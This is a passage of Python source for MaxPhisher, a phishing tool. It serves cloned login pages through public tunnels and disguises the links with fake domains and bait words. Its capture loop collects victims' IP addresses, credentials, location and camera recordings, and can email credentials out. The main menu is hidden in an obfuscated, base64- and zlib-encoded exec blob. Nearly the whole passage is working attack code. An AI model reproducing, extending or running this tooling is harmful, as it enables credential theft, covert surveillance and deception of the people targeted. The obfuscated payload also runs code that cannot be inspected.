            print(f"{error}Download failed due to: {str(e)}")
            print(f"\n{info}Retrying {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}Download failed permanently!")
        pexit()


# Extract zip/tar/tgz files
def extract(filename, extract_path='.'):
    directory = dirname(extract_path)
    newfile = filename.split(".")[0] if "." in filename else filename
    if directory!="" and not isdir(directory):
        mkdir(directory)
    print(f"\n{info}Extracting {green}{newfile.title()}{nc}...\n")
    try:
        if ".zip" in filename:
            with ZipFile(filename, 'r') as zip_ref:
                if zip_ref.testzip() is None:
                    zip_ref.extractall(extract_path)
                else:
                    print(f"\n{error}Zip file corrupted!")
                    delete(filename)
                    exit()
            return
        tar = taropen(filename, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        delete(file)
        print(f"{error}{str(e)}")
        exit(1)
        

def get_media():
    media_files = []
    for file in listdir(site_dir):
        extension = file.split(".")[-1]
        if extension in extensions:
            if file=="desc.png" or file=="kk.jpg":
                continue
            media_files.append(f"{site_dir}/{file}")
    return media_files

def write_meta(url):
    if url=="":
        return
    allmeta = get_meta(url)
    if allmeta=="":
        print(f"\n{error}URL isn't correct!")
    write(allmeta, f"{site_dir}/meta.php")


def write_redirect(url):
    global redir_url
    if url == "":
        url = redir_url
    sed("redirectUrl", url, f"{site_dir}/login.php")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)





# Set up ngrok authtoken to work with ngrok links
def nr_token():
    global nr_command
    while True:
        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
             break
        has_token = input(f"\n{ask}Do you have ngrok authtoken? [y/n/help]: {green}")
        if has_token == "y":
            token = input(f"\n{ask}Enter your ngrok authtoken: {green}")
            shell(f"{nr_command} config add-authtoken {token}")
            sleep(1)
            break
        elif has_token == "help":
            sprint(nr_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

# Set up ngrok authtoken to work with ngrok links
def lx_token():
    global lx_command
    while True:
        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            break
        has_token = input(f"\n{ask}Do you have loclx access token? [y/n/help]: {green}")
        if has_token == "y":
            shell(f"{lx_command} account login")
            break
        elif has_token == "help":
            sprint(lx_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)


def ssh_key():
    if not isfile(f"{home}/.ssh/id_rsa.pub"):
        print(f"\n{info}Wait a moment! Then press enter three times for ssh key generation{nc}\n")
        sleep(1)
        shell("ssh-keygen")
    is_known = bgtask("ssh-keygen -F localhost.run").wait()
    if is_known != 0:
        shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)

# Additional configuration for login phishing
def set_login():
    global url
    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_meta(metaurl)
    if url is not None:
        redirect_url = url
    else:
        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_redirect(redirect_url)

# Additional configuration for image phishing
def set_image():
    global fest, ytid
    sed("festName", fest, f"{site_dir}/index.html")
    ytid = sub("([/%+&?={} ])", "", ytid)
    sed("ytId", ytid, f"{site_dir}/index.html")

# Additional configuration for video phishing
def set_duration():
    global duration
    recordingTime = str(duration)
    sed("recordingTime", recordingTime, f"{site_dir}/recorder.js")
    

# Set redirection after data capture
def set_redirect(redir_url, write=False):
    global mask, url
    if redir_url != "":
        if url is not None:
            website = url
        else:
            website = input(f"\n{ask}Enter the url to redirect {cyan}[{purple}press enter to use default{cyan}]{blue}> {green}")
        if website == "":
            website = redir_url
        if write:
            write_meta(website)
        if mask == "":
            mask = f'https://{sub("([/%+&?={} ])", "-", sub("https?://", "", website))}'
        sed("redirectUrl", website, f"{site_dir}/index.php")


# Output urls
def url_manager(url, arg1, arg2):
    global mask
    print(f"\n{info2}{arg1} > {yellow}{url}")
    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
    sleep(0.5)

    
# Copy website files from custom location
def customfol():
    global mask
    while True:
        fol = input(f"\n{ask}Enter the directory > {green}")
        if isdir(fol):
            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
                # Remove slash and spaces from mask
                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
                copy(fol, site_dir)
                return fol
            else:
                sprint(f"\n{error}index.php/index.html required but not found!")
        else:
            sprint(f"\n{error}Directory do not exists!")


# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return

# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}MaxPhisher{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return


# Optional function for ngrok url masking
def masking(url):
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if cust=="":
        return
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    resp = res.split("\n")[0] if "\n" in res else res
    if "https://" not in resp:
        sprint(f"{error}Service not available!\n{error}{resp}")
        waiter()
    short = resp.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
        domain = "https://"
    else:
        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
        domain = "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")


# Staring functions

# Update of MaxPhisher
def updater():
    internet()
    if not isfile("files/maxphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        append(e, error_file)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        clear(fast=True)
        print(f"{info}MaxPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update MaxPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            shell("cd .. && rm -rf MaxPhisher maxphisher && git clone https://github.com/KasRoudra/MaxPhisher")
            sprint(f"\n{success}MaxPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# Installing packages and downloading tunnelers
def requirements():
    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
    if termux:
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            shell("termux-setup-storage")
    internet()
    if termux:
        if not is_installed("proot"):
            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    isngrok = isfile(f"{tunneler_dir}/ngrok")
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    isloclx = isfile(f"{tunneler_dir}/loclx")
    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
        if isfile("ngrok.tgz"):
            extract("ngrok.tgz", f"{tunneler_dir}")
            remove("ngrok.tgz")
    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    if isfile("loclx.zip"):
        extract("loclx.zip", f"{tunneler_dir}")
        remove("loclx.zip")
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("ngrok"):
        nr_command = "ngrok"
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if is_installed("localxpose"):
        lx_command = "localxpose"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "maxsites.zip")
    else:
        download(websites_url, "maxsites.zip")
    if isfile("maxsites.zip"):
        extract("maxsites.zip", ".tempdir")
        delete("maxsites.zip")
        copy(f".tempdir/{repo_branch}", sites_dir)
        delete(".tempdir")
    if isfile("websites.zip"):
        delete(sites_dir)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        nr_token()
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed")
            sleep(1)

        
# Main Menu to choose phishing type
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'=I0ZwmyA//73Pb/dPCNP5lrwW0suKt9+uHNmBSgY4jGa9WIFBJqgzIVpivBNKHtcIk29qf33DcP5EVuAT3tXxuIVgGtENy27K4KfM5z1QeuvmiqweYN/5xqbORxAnIzS6sOvAL8EoEl9qPGvzAxgdiR0cU95EM7gaRxFNSEpCJxL8GDcHPhP8SkXx/7iraBdJEYYyZXRSYb8JyLH1foUYkJ6RDaxPsC33ThuNIm3xDz31ozVPp6v1oDN76OfE5jPDfj++cvsPzl97ijIfYntIhNy2Lox9RHVKtVUIGnW9GKwkLXUB45yFIfkDW/jrrlmLnsiyXsTD1lHJTr1J2afgk3J5ZU7yW8tcJKcJJBFZaO7PWM/hxOMtBTVuNt9RJlp7MsNpieFFOq1iTioWjtWMIkjs1C4epRaJtw4I3qd/yjtjw5fUd4EQkd9WL2pLzKSIDvLzngXQOqOYaPZvHkb0wfkMP8n/cfoJ1xK9gt6P6qUiQ+WoALYUdEqHZZ2MWTcN6u7dBMZ6klMmBeS6agq8mZ3SHG63qzvf8ab4Y0w0U0n16QZ5wNaUglMdbGI9xs5To79s5Ps3Co6USfHG0LnsyDrDTqS+tUeq1ATxaXRPEVc9uWy4j6nnW0HBydykjGJ8WnuND53PyFpbXepc/d3qGOw60MVpcoK4W9PEuvdCtkLWR6t/EjiqFSzdxFdeSwmEdMC7EtbbGWy556eo4g8ilMs8TfrW0PGpBg9LnPcbdROoq/Ukgwm2Cpt8Ak2HzolaBhKr9RKcd3l5ROzvkvcsItN9tV3Bc4ySEL8SBzMzd5M+yU5i7S4kH87pSixE18jKgGcW3ad/9cg8i4IpdMPRPHfH4t6j9ZzfJGFIU2TyI+02oz5kVLpYyMaLQ5cxKTBmndblzsNBrV+B95bzUftfewUhW3koBe/+q3pKYK8mwZX71wv7RcBGO4FICvcJOcNl/DpfaEKlJbYy2cxjrWQt5Tink1G7jPd4/1eQTUw4Qk4bWYXhw0nxhNGrGO/f9DzTPIHfXK2DV/GI8BwyoK10PJ0S1tH1ZEj3AhelI8F5J29Z1vngkipmktXgxPJwkzsKDX4oXKVr5TFz+JQ7/hT220E9QDkzJQ3Xc+Gbsaa81TOqUa98aenUv3tTnMOI9AJhMXSUQSxOFrxhix2H3j2PGxisZKd4E3SKIKQsj4Kvyq1rhPNbgBMxj7GUT7dAA0WRv8YpI9432YfpA9UMfqJp7TBcz1XCds3KKrn/s0TQO5w/PBVE+k0mPg9ZhE/lgdKjxFJ3NsCdXf09AjqsL3Cy04rTyM/7V23YCm7tmqRw5/3pViC0fg1XAs8WGNx3elRvmjD4HvzOfvYsrds0bY+iwco0T1lPt0rYwbHfVyGddje/yhceYuVNViknHTAEmLpQipERgKrTu4125rn1IbPMvFFMGV8QQLfpr5OmRRVUp5xkbzOuz3nT5rVzjHK+cCgpvWMpGgIQIZZwjHVqjlGzX+2w/Nf0bQOav1+oz2dlBla7oHan2x6KWmg3Kmcl4T050AJu+V0VQC6OqaRGnJUJe8ZQoEMeWKMh7WtofU7c4pTWc+3b+SA0R7rEB2VibXj4xh2YNaHdduhZNjKpXfIgdwkQrtGXv5XacazG0zHJcvdS+hHCbLrsbA6qyiEBIwQ83h9nRC+Gofo7a5fWJ9GrlPX50D0cxuvxa/Mf7Rh62aQLUCC1AWrhxDRSjNvqyYf77htWFfhFculBjIgB33r7Izci8rDoumA+iccx0nrO3jI1M6jj/XxBaldsThxjZSJvk608Y96d71fVC2uIucWAwT0jfc8HDCpDGf+/9J+f++75zv/LNjsav7qgy1nnuzuFODZQcCBgvYMvJwQCzyX87MPAg1qSUUVNwJe'))

# Start server and tunneling
def server():
    global mode
    clear()
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file, lx_file, lhr_file]:
        delete(logfile)
        if not isfile(logfile):
            mknod(logfile)
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    lx_log = open(lx_file, "w")
    lhr_log = open(lhr_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{nr_command} http {arguments} {local_url}")
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
    bgtask(f"ssh -R 80:{local_url} localhost.run -T", stdout=lhr_log, stderr=lhr_log)
    sleep(10)
    try:
        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
        nr_url = nr_api["tunnels"][0]["public_url"]
    except Exception as e:
        append(e, error_file)
        nr_url = ""
    if nr_url != "":
        nr_success=True
    else:
        nr_success=False
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)
    lx_success = False
    for i in range(10):
        lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
        if lx_url != "https://":
            lx_success = True
            break
        sleep(1)
    lhr_success = False
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhrtunnel.link)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        sleep(1)
    if nr_success or cf_success or lx_success or lhr_success:
        if mode == "test":
            print(f"\n{info}URL Generation completed successfully!")
            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
            pexit()
        sprint(f"\n{info}Your urls are given below:")
        if nr_success:
            url_manager(nr_url, "Ngrok", "NR Masked")
        if cf_success:
            url_manager(cf_url, "CloudFlared", "CF Masked")
        if lx_success:
            url_manager(lx_url, "LocalXpose", "LX Masked")
        if lhr_success:
            url_manager(lhr_url, "LocalHR", "LHR Masked")
        if nr_success and tunneler.lower() == "ngrok":
            masking(nr_url)
        elif lx_success and tunneler.lower() == "loclx":
            masking(lx_url)
        elif lhr_success and tunneler.lower() == "localhostrun":
            masking(lhr_url)
        elif cf_success and tunneler.lower() == "cloudflared":
            masking(cf_url)
        else:
            print(f"\n{error}URL masking not available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file, log_file)
    for file in get_media():
        remove(file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                add_json(text2json(userdata), cred_json)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            if isfile(info_file):
                print(f"\n\n{success}{bgreen}Victim Info found!\n\007")
                show_file_data(info_file)
                info_data = cat(info_file)
                append(info_data, main_info)
                add_json(text2json(info_data), info_json)
                print(f"\n{info2}Saved in {main_info}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(info_file)
            if isfile(location_file):
                print(f"\n\n{success}{bgreen}Victim Location found!\n\007")
                show_file_data(location_file)
                location_data = cat(location_file)
                append(location_data, main_location)
                add_json(text2json(location_data), location_json)
                print(f"\n{info2}Saved in {main_location}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(location_file)
            if isfile(log_file):
                print(f"\n{success}{bgreen}Media file captured!\007")
                for file in get_media():
                    copy(file, directory)
                    remove(file)
                    print(f"\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                if get_media()==[]:
                    remove(log_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
